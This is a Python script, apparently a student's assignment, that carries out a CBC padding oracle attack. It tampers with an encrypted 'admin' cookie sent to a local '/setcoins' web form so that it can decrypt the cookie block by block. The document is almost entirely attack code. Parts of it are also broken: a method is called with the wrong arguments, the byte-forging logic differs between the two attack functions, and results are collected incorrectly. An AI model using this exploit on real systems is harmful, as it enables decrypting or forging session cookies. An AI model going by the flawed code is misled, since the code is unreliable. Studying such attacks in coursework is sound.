import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms
from requests import codes, Session
#from Crypto.Ciphers import AES

import base64
import binascii
from hashdos import do_login_form


SETCOINS_FORM_URL = "http://localhost:8080/setcoins"
#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = ciphers.algorithms.AES.block_size/8

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        sess=Session()
        #plaintext=binascii.hexlify(ct)

        data_dict = {"username":'visitor',\
    			"amount":str(100),\
    			}
        sess.cookies.set('admin',None)
        sess.cookies.set('admin',ct)
        response = sess.post(SETCOINS_FORM_URL,data_dict)

        return b'Bad padding for admin cookie!' not in response.content


def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
#attacker could have cipher text of the form c=(c[0],c[1],c[2])
#attacker would want to obtain decryption of each of these blocks
#xor plaintext password (guess) wit the last block of the cipher txt
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle.
    @ctx: a ciphertext
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
    "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, int(po.block_length)))
    i2=[0]*int(po.block_length)
    p2=[0]*int(po.block_length)
    for i in range (15,-1,-1):
        for b in range(0,256):
            prefix=c0[:i]
            pad_byte=int(po.block_length)-i
            suffix = [pad_byte ^ val for val in p2[i+1:]]
            evil=bytearray(prefix)
            evil.append(b^c0[i])
            evil.extend(suffix)
            assert(len(evil)==po.block_length)
            text_c0=bytes(evil)
            if po.test_ciphertext((text_c0+c1).hex()):
                i2[i]=b^pad_byte
                print (i2)
                p2[i]=c0[i]^i2[i]
                break
    print (p2)
    return p2

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle.
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, int(po.block_length)))
    nblocks = len(ctx_blocks)
    sess= Session()
    assert(do_login_form(sess,'attacker','attacker'))
    p2s=[]
    for block_num in range(nblocks-1):
        c0=list(ctx_blocks[block_num])
        c1=list(ctx_blocks[block_num+1])
        i2=[0]*int(po.block_length)
        p2=[0]*int(po.block_length)
        for i in range(15,-1,-1):
            for b in range(0,256):
                prefix=c0[:i]
                pad_byte=(po.block_length-i)
                suffix=(pad_byte^val for val in i2[i+1:])
                ba=bytearray(prefix)
                ba.append(b)
                ba.extend(suffix)
                assert len(ba)==po.block_length
                mauled_c0=bytes(ba)
                if po.test_ciphertext(sess,(mauled_c0+c1).hex())==1:
                    i2[i]=b^pad_byte
                    p2[i]=c0[i]^i2[i]
    p2s.extend(p2)
    print(''.join(map(chr,p2s)))



    # message=''
    # for i in range (1,nblocks):
    #     cipher=ctx_blocks[i-1]+ctx_blocks[i]
    #     current=po_attack_2blocks(po, cipher)
    #     message=message+''.join(map(chr,current))
    # return message



    # TODO: Implement padding oracle attack for arbitrary length message.
def do_attack(cookie):
    po=PaddingOracle(SETCOINS_FORM_URL)
    po_attack(po,bytes.fromhex(cookie))
if __name__ == '__main__':
    cookie='e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d'
    do_attack(cookie)
